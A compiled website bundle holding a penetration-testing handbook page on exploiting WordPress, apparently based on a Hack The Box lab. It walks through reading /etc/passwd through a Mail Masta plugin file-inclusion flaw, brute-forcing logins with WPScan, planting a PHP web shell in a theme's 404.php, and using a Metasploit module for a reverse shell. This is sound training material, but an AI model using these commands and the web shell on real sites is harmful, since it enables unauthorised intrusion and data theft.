"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[2289],{8099:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>l,contentTitle:()=>r,default:()=>p,frontMatter:()=>o,metadata:()=>a,toc:()=>c});var i=s(5893),t=s(1151);const o={},r="Exploitation",a={id:"offensive-security/wordpress/exploitation/README",title:"Exploitation",description:"Vulnerable plugin",source:"@site/docs/offensive-security/wordpress/exploitation/README.md",sourceDirName:"offensive-security/wordpress/exploitation",slug:"/offensive-security/wordpress/exploitation/",permalink:"/cybersecurity-handbook/offensive-security/wordpress/exploitation/",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Wordpress enumeration",permalink:"/cybersecurity-handbook/offensive-security/wordpress/enumeration/"},next:{title:"WordPress hardening",permalink:"/cybersecurity-handbook/offensive-security/wordpress/hardening/"}},l={},c=[{value:"Vulnerable plugin",id:"vulnerable-plugin",level:2},{value:"Leveraging WPScan results",id:"leveraging-wpscan-results",level:3},{value:"Local File Inclusion (LFI) example",id:"local-file-inclusion-lfi-example",level:4},{value:"User bruteforce",id:"user-bruteforce",level:2},{value:"Theme editor",id:"theme-editor",level:2},{value:"Remote Code Execution (RCE) example",id:"remote-code-execution-rce-example",level:3},{value:"Metasploit",id:"metasploit",level:2},{value:"Reverse shell",id:"reverse-shell",level:3}];function d(e){const n={a:"a",admonition:"admonition",code:"code",em:"em",h1:"h1",h2:"h2",h3:"h3",h4:"h4",img:"img",p:"p",pre:"pre",...(0,t.a)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h1,{id:"exploitation",children:"Exploitation"}),"\n",(0,i.jsx)(n.h2,{id:"vulnerable-plugin",children:"Vulnerable plugin"}),"\n",(0,i.jsx)(n.h3,{id:"leveraging-wpscan-results",children:"Leveraging WPScan results"}),"\n",(0,i.jsxs)(n.p,{children:["The following report generated by WPScan tells us that the website uses an older version of WordPress (5.3.2) and an outdated theme called ",(0,i.jsx)(n.code,{children:"Twenty Twenty"}),". WPScan identified two vulnerable plugins, ",(0,i.jsx)(n.code,{children:"Mail Masta 1.0"})," and ",(0,i.jsx)(n.code,{children:"Google Review Slider"}),". This version of the ",(0,i.jsx)(n.code,{children:"Mail Masta"})," plugin is known to be vulnerable to SQLi as well as ",(0,i.jsx)(n.em,{children:"Local File Inclusion"})," (",(0,i.jsx)(n.em,{children:"LFI"}),"). The report output also contains URLs to PoCs, which provide information on how to exploit these vulnerabilities."]}),"\n",(0,i.jsxs)(n.p,{children:["Let's verify if the LFI can be exploited based on this ",(0,i.jsx)(n.a,{href:"https://academy.hackthebox.com/module/17/section/44",children:"exploit-db report"}),". The exploit states that any unauthenticated user can read local files through the path: ",(0,i.jsx)(n.code,{children:"/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"}),"."]}),"\n",(0,i.jsx)(n.h4,{id:"local-file-inclusion-lfi-example",children:"Local File Inclusion (LFI) example"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"browser",src:s(4995).Z+"",width:"1249",height:"452"})}),"\n",(0,i.jsx)(n.p,{children:"We can validate this vulnerability using cURL on the CLI:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-console",children:"$ curl http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\n"})}),"\n",(0,i.jsx)(n.h2,{id:"user-bruteforce",children:"User bruteforce"}),"\n",(0,i.jsxs)(n.p,{children:["WPScan can be used to brute force usernames and passwords. It can use ",(0,i.jsx)(n.code,{children:"xmlrpc"})," (WordPress API through ",(0,i.jsx)(n.code,{children:"/xmlrpc.php"}),") and ",(0,i.jsx)(n.code,{children:"wp-login"})," (WordPress login page) methods."]}),"\n",(0,i.jsx)(n.admonition,{type:"tip",children:(0,i.jsxs)(n.p,{children:["The ",(0,i.jsx)(n.code,{children:"xmlrpc"})," method is preferred as it is faster."]})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-console",children:"wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com\n"})}),"\n",(0,i.jsx)(n.h2,{id:"theme-editor",children:"Theme editor"}),"\n",(0,i.jsx)(n.h3,{id:"remote-code-execution-rce-example",children:"Remote Code Execution (RCE) example"}),"\n",(0,i.jsx)(n.p,{children:"With administrative access to WordPress, we can modify the PHP source code to execute system commands."}),"\n",(0,i.jsxs)(n.p,{children:["Log in to WordPress with the administrator credentials, which should redirect us to the admin panel. Click on ",(0,i.jsx)(n.code,{children:"Appearance"})," on the side panel and select ",(0,i.jsx)(n.code,{children:"Theme Editor"}),". Select an inactive theme in order to avoid corrupting the main theme."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"theme editor",src:s(393).Z+"",width:"1088",height:"480"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"select theme",src:s(8606).Z+"",width:"1122",height:"326"})}),"\n",(0,i.jsxs)(n.p,{children:["Next, choose a non-critical file such as ",(0,i.jsx)(n.code,{children:"404.php"})," to modify and add a web shell."]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",children:"<?php\n\nsystem($_GET['cmd']);\n\n/**\n * The template for displaying 404 pages (not found)\n *\n * @link https://codex.wordpress.org/Creating_an_Error_404_Page\n<SNIP>\n"})}),"\n",(0,i.jsxs)(n.p,{children:["This will allow us to directly execute OS commands by sending a GET request and appending the ",(0,i.jsx)(n.code,{children:"cmd"})," parameter (e.g., ",(0,i.jsx)(n.code,{children:"404.php?cmd=id"}),")."]}),"\n",(0,i.jsx)(n.p,{children:"You can validate it by issuing a curl command:"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-console",children:'$ curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"\n\nuid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)\n<SNIP>\n'})}),"\n",(0,i.jsx)(n.h2,{id:"metasploit",children:"Metasploit"}),"\n",(0,i.jsx)(n.h3,{id:"reverse-shell",children:"Reverse shell"}),"\n",(0,i.jsx)(n.p,{children:"We can obtain a reverse shell using valid credentials for an account that has sufficient rights to create files on the webserver."}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-console",children:"$ msfconsole\n$ msf5 > search wp_admin\n\nMatching Modules\n================\n\n#  Name                                       Disclosure Date  Rank       Check  Description\n-  ----                                       ---------------  ----       -----  -----------\n0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload\n"})}),"\n",(0,i.jsxs)(n.p,{children:["The number ",(0,i.jsx)(n.code,{children:"0"})," in the search results represents the ID for the suggested modules."]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-console",children:"msf5 > use 0\n\nmsf5 exploit(unix/webapp/wp_admin_shell_upload) >\n\nmsf5 exploit(unix/webapp/wp_admin_shell_upload) > options\n\nModule options (exploit/unix/webapp/wp_admin_shell_upload):\n\nName       Current Setting  Required  Description\n----       ---------------  --------  -----------\nPASSWORD                    yes       The WordPress password to authenticate with\nProxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\nRHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\nRPORT      80               yes       The target port (TCP)\nSSL        false            no        Negotiate SSL/TLS for outgoing connections\nTARGETURI  /                yes       The base path to the wordpress application\nUSERNAME                    yes       The WordPress username to authenticate with\nVHOST                       no        HTTP server virtual host\n\n\nExploit target:\n\nId  Name\n--  ----\n0   WordPress\n"})}),"\n",(0,i.jsxs)(n.p,{children:["After using the ",(0,i.jsx)(n.code,{children:"set"})," command to make the necessary modifications, we can use the ",(0,i.jsx)(n.code,{children:"run"})," command to execute the module. If all of our parameters are set correctly, it will spawn a reverse shell on the target upon execution."]})]})}function p(e={}){const{wrapper:n}={...(0,t.a)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}},393:(e,n,s)=>{s.d(n,{Z:()=>i});const i=s.p+"assets/images/image-1-ed8031c82ca41720a000321f0713006a.png"},8606:(e,n,s)=>{s.d(n,{Z:()=>i});const i=s.p+"assets/images/image-2-01e34a9fe2a7605b3a82d404e95b8f60.png"},4995:(e,n,s)=>{s.d(n,{Z:()=>i});const i=s.p+"assets/images/image-8a39dbc2fd5e4c316e3fbc7565cccb53.png"},1151:(e,n,s)=>{s.d(n,{Z:()=>a,a:()=>r});var i=s(7294);const t={},o=i.createContext(t);function r(e){const n=i.useContext(o);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:r(e.components),i.createElement(o.Provider,{value:n},e.children)}}}]);